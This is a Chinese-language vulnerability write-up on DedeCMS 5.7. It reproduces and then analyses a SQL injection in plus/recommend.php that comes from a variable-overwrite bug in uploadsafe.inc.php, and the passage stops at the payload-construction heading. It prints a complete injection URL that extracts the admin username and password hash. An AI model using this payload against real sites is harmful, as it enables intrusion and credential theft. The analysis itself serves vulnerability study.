---
description: 记录DedeCMS5.7漏洞信息
---

# DedeCMS5.7漏洞利用与分析

 源码链接：[https://pan.baidu.com/s/12PPzu6yho-ae1XRsQs5zxw](https://pan.baidu.com/s/12PPzu6yho-ae1XRsQs5zxw) 提取码：ay3g

## 漏洞复现

在分析漏洞形成原因之前，先来看一下这个漏洞复现情况。

查看系统的发布日期，直接访问 网站url/data/admin/ver.txt

![](../.gitbook/assets/image%20%28140%29.png)

此时间发布的版本在plus/recommend.php中存在注入漏洞，在此演示直接爆出用户名和密码散列值的payload

```text
/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` limit+0,1),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111
```

![&#x6F0F;&#x6D1E;&#x8868;&#x73B0;](../.gitbook/assets/image%20%28166%29.png)

## 漏洞分析

打开recommend.php,查看代码，第12行程序引入了一个common.inc.php

![](../.gitbook/assets/image%20%28129%29.png)

跟进去看一下

![](../.gitbook/assets/image%20%2863%29.png)

只要提交的URL中不包含cfg\_\|GLOBALS，即可通过检查。继续往下看代码

![](../.gitbook/assets/image%20%2837%29.png)

在第95行引入了uploadsafe.inc.php文件，查看文件代码，在第29行存在一个漏洞。

```text
$$_key = $_FILES[$_key]['tmp_name'] = str_replace("\\\\", "\\", $_FILES[$_key]['tmp_name']);
```

传入$\_key为type时 该语句就变成了对$type的赋值，导致了对$type变量覆盖，而在recommend.php中第38行，用到了$type变量来拼接sql语句。

```text
$arcRow=$dsql->GetOne("SELECT s.*,t.* FROM `#@__member_stow` AS s LEFT JOIN `#@__member_stowtype` AS t ON s.type=t.stowname WHERE s.aid='$aid' AND s.type='$type'");
```

## 如何构造payload

我们已经知道了漏洞存在的点，该如何达到目的那？



